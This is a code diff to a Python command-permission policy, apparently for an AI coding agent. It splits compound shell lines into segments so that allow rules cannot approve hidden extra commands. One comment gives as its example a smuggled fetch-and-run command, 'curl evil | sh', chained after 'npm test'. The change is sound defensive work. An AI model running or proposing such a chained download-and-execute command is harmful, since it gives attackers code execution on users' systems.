@@ -19,7 +19,7 @@ from __future__ import annotations
 import fnmatch
 import hashlib
 import re
-from typing import Iterable, Optional, Set, Tuple
+from typing import Iterable, List, Optional, Set, Tuple
 
 _CATASTROPHIC = [
     # Target may be quoted, end in "/" or "/*", and be followed by a shell or
@@ -62,6 +62,32 @@ _CODE_RISKY_RE = [(re.compile(p), why) for p, why in _CODE_RISKY]
 _RISKY_RE = [(re.compile(p), why) for p, why in _RISKY]
 
 
+# Shell control operators. Rules are matched per segment, so `cd x && git push` is still a `git push`,
+# and an allow rule for `npm test*` cannot vouch for `npm test; curl evil | sh`.
+_REDIRECT_AMP_RE = re.compile(r"\d*>&\d*|&>")            # 2>&1, >&2, &> file: not command separators
+_SEGMENT_SPLIT_RE = re.compile(r"&&|\|\||\$\(|[;&|\n()`]")
+_SUBSTITUTION_RE = re.compile(r"\$\(|`|<\(|>\(")
+_WRAPPER_RE = re.compile(r"^(?:sudo(?:\s+-\S+)*|command|nohup|time|exec|nice|env(?:\s+\w+=\S*)*)\s+")
+
+
+def split_segments(command: str) -> List[str]:
+    """The individual simple commands inside a compound shell command line."""
+    cleaned = _REDIRECT_AMP_RE.sub(" ", command or "")
+    return [part.strip() for part in _SEGMENT_SPLIT_RE.split(cleaned) if part.strip()]
+
+
+def _variants(segment: str) -> List[str]:
+    """The segment, and the same with leading sudo/env/time/... wrappers peeled off."""
+    out, current = [segment], segment
+    for _ in range(4):
+        stripped = _WRAPPER_RE.sub("", current, count=1).strip()
+        if stripped == current or not stripped:
+            break
+        out.append(stripped)
+        current = stripped
+    return out
+
+
 class CommandPolicy:
     def __init__(
         self,
@@ -84,10 +110,26 @@ class CommandPolicy:
 
     @staticmethod
     def _matches(command: str, patterns: Iterable[str]) -> Optional[str]:
+        """The first pattern that matches the whole command line OR any segment of it (fail closed:
+        used for deny and ask rules, where matching more is the safe direction)."""
+        patterns = list(patterns)
+        candidates = [command]
+        for segment in split_segments(command):
+            candidates.extend(_variants(segment))
         for pat in patterns:
-            if fnmatch.fnmatchcase(command, pat):
+            if any(fnmatch.fnmatchcase(c, pat) for c in candidates):
                 return pat
         return None
+
+    def _allowed_by_rule(self, command: str) -> bool:
+        """True only if allow rules cover the WHOLE command: every segment matches some rule and nothing
+        is hidden in a command substitution. (Deny/catastrophic/ask are checked before this.)"""
+        if not self.allow or _SUBSTITUTION_RE.search(command):
+            return False
+        segments = split_segments(command)
+        return bool(segments) and all(
+            any(fnmatch.fnmatchcase(v, pat) for v in _variants(seg) for pat in self.allow) for seg in segments
+        )
 
     def decide(self, command: str) -> Tuple[str, str]:
         """Return ``(decision, reason)`` where decision is allow|ask|deny."""
@@ -100,7 +142,7 @@ class CommandPolicy:
                 return "deny", f"blocked: {why}"
         if cmd in self.approved:
             return "allow", "approved earlier this session"
-        if self._matches(cmd, self.allow):
+        if self._allowed_by_rule(cmd):
             return "allow", "allowed by permissions.commands.allow"
         hit = self._matches(cmd, self.ask)
         if hit:
